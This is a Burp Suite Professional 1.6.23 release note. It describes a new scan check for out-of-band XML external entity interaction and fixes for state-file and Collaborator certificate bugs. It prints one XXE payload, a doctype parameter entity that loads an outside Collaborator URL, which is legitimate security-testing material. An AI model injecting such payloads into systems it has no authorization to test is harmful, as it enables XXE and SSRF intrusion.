# Professional 1.6.23

Source: https://portswigger.net/burp/releases/professional-1-6-23
Fetched: 2026-06-28T09:16:27.346199+00:00

This release adds a new scan check for external service interaction and out-of-band resource load via injected XML doctype tags containing entity parameters. Burp now sends payloads like:

<?xml version='1.0' standalone='no'?><!DOCTYPE foo [<!ENTITY % f5a30 SYSTEM "http://u1w9aaozql7z31394loost.burpcollaborator.net">%f5a30; ]>

and reports an appropriate issue based on any observed interactions (DNS or HTTP) that reach the Burp Collaborator server.

The release also fixes some issues:

Some bugs affecting the saving and restoring of Burp state files.

A bug in the Collaborator server where the auto-generated self-signed certificate does not use a wildcard prefix in the CN. This issue only affects private Collaborator server deployments where a custom SSL certificate has not been configured.
